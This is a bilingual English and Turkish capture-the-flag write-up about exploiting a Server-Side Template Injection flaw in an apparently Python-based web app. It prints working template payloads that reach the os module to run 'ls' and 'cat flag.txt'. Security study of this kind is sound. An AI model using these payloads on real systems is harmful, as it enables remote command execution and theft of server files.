# Server-Side Template Injection (SSTI)

## 🇬🇧 English

### Vulnerability Identification

In this challenge, I identified a **Server-Side Template Injection (SSTI)** vulnerability.

To verify whether user-controlled input was being evaluated by the server-side template engine, I submitted a simple mathematical expression:

```text
{{ 8*8 }}
```

The application returned:

```text
64
```

Since the expression was evaluated instead of being displayed as plain text, this confirmed that the input was being processed by the template engine and that the application was vulnerable to **SSTI**.

---

### Escalating SSTI to Remote Code Execution

After confirming the vulnerability, I investigated whether the template context could be used to access Python objects and ultimately execute operating-system commands.

Through the exposed `config` object, I accessed the global namespace and reached Python's `os` module.

I then used the following payload to execute the `ls` command and inspect the files in the current directory:

```text
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

The server executed the command and returned the directory contents in the HTTP response.

---

### Retrieving the Flag

After identifying `flag.txt` in the directory listing, I used the same technique to read its contents:

```text
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

The contents of the file were returned by the application, allowing me to retrieve the flag.

---

### What I Learned

This challenge demonstrated how an **SSTI vulnerability** can become significantly more dangerous when the template environment exposes sensitive Python objects.

The exploitation path was:

```text
User Input
    ↓
Template Expression Evaluation
    ↓
SSTI Confirmation
    ↓
Python Object Access
    ↓
os Module Access
    ↓
Command Execution (RCE)
    ↓
Flag Retrieval
```

---

## 🇹🇷 Türkçe

### Güvenlik Açığının Tespit Edilmesi

Bu challenge'da uygulamanın kullanıcı girdilerini sunucu tarafındaki bir **template engine (şablon motoru)** içerisinde işlediğini fark ettim.

Kullanıcı tarafından gönderilen ifadelerin gerçekten template engine tarafından değerlendirilip değerlendirilmediğini kontrol etmek için basit bir matematiksel ifade kullandım:

```text
{{ 8*8 }}
```

Uygulama şu sonucu döndürdü:

```text
64
```

İfade düz metin olarak gösterilmek yerine hesaplandığı için kullanıcı girdisinin template engine tarafından işlendiğini doğruladım. Böylece uygulamada **Server-Side Template Injection (SSTI)** açığı bulunduğunu tespit ettim.

---

### SSTI'dan Remote Code Execution'a Geçiş

SSTI açığını doğruladıktan sonra template context üzerinden Python nesnelerine erişilip erişilemeyeceğini araştırdım.

Erişilebilir durumdaki `config` nesnesi üzerinden global namespace'e ulaşarak Python'ın `os` modülüne erişebildim.

Ardından mevcut dizindeki dosyaları görüntülemek amacıyla `ls` komutunu çalıştırmak için şu payload'ı kullandım:

```text
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

Sunucu komutu çalıştırdı ve dizindeki dosyaların listesini HTTP yanıtı içerisinde döndürdü.

---

### Flag'in Elde Edilmesi

Dosya listesini incelediğimde `flag.txt` dosyasını tespit ettim.

Aynı yöntemle dosyanın içeriğini okumak için:

```text
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

payload'ını kullandım.

Komutun çıktısı uygulama tarafından döndürüldü ve böylece flag'i elde ettim.

---

### Bu Challenge'dan Öğrendiklerim

Bu challenge, basit görünen bir **SSTI açığının**, template ortamında hassas Python nesnelerine erişilebilmesi durumunda **Remote Code Execution (RCE)** seviyesine kadar ilerleyebileceğini gösterdi.

İzlenen süreç özetle:

```text
Kullanıcı Girdisi
      ↓
Template İfadesinin Çalıştırılması
      ↓
SSTI Açığının Doğrulanması
      ↓
Python Nesnelerine Erişim
      ↓
os Modülüne Erişim
      ↓
Komut Çalıştırma (RCE)
      ↓
Flag'in Elde Edilmesi
```
